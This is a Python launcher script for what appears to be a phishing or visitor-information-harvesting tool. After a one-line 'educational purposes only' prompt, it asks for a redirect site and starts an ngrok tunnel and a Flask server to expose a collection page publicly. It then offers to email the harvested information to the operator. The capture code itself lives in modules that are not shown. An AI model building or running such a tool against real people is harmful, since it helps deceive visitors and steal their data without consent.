import sys, os

from modules.server import flaskServer
from modules.server import ngrokServer
from modules.mailer import mailer

from style.colors import style
from style.banners import *


def main():
    print (u"{}[2J{}[;H".format(chr(27), chr(27)))
    banner()
    edu_check_ = input(style.GREEN("\n[+]") + style.RESET(" Do you agree on using this program for educational purposes only [y/n]: "))
    sys.exit() if  edu_check_.lower() != "y" else print('')

    redirect =input(style.GREEN("[+]") + style.RESET(" Enter redirect website, leave empty for default (https://google.com): "))
    redirect = "https://google.com" if redirect == "" else redirect

    print (u"{}[2J{}[;H".format(chr(27), chr(27)))
    banner()
    print(style.GREEN("\n[+]") + style.RESET(" Starting Ngrok server..."))
    ngrokServer()
    print(style.GREEN("[+]") + style.RESET(" Starting Flask Server... "))
    print(style.RED("\n[+]") + style.RESET(" Press CTRL + C to go back to home screen.") + style.RESET("\n"))

    flaskServer(redirect)

    print (u"{}[2J{}[;H".format(chr(27), chr(27)))
    banner()
    mailopt_ =  input(style.GREEN("\n[+]") + style.RESET("Do you want to send the information found to your email [y/n]: "))
    mailer() if mailopt_.lower() == "y" else sys.exit()
main()
